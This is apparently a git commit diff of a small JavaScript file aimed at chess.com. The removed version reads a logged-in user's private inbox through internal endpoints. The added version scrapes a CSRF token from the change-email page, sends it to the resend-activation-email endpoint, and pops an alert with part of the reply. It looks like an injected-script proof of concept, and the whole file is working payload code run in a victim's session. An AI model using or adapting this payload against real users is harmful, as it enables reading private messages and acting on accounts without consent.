179c103c05e31ade10640b59c5f23c11d8068608
yellowrook1 <95589375+yellowrook1@users.noreply.github.com>
2021-12-13 20:59:38 -0500

    Update a.js

--- a.js
+++ a.js
@@ -1,11 +1,12 @@
-fetch("https://www.chess.com/callback/messages/list/inbox").then(response => response.json())
-  .then(data => {console.log(data);
-  for (var i = 0; i < data.length; i++){
-      fetch("https://www.chess.com/callback/messages/show/"+data[i].user.username).then(response => response.json())
-  .then(data => {for (var i = 0; i < data.length; i++){
-      console.log(data[i].from_user.username)
-      if (data[i].from_user.username == "CHESScom"){
-      console.log("Time: " + data[i].createDate + " From: " + data[i].from_user.username + " To: " + data[i].to_user.username + " Message: " + data[i].message)}
-  }})
-  }
-})
+fetch("https://www.chess.com/settings/change-email").then((response) => response.text())
+    .then((text) => {
+            var token = text.match(/("token":".+?)["]/)[1].substr(9); 
+            fetch("https://www.chess.com/callback/resend-activation-email", {
+            "headers": {
+                "content-type": "application/x-www-form-urlencoded",
+            },
+            "body": "_token=" + token,
+            "method": "POST",
+        }).then(response => response.json())
+  .then(data => {alert(data.message.substr(37))});
+    });
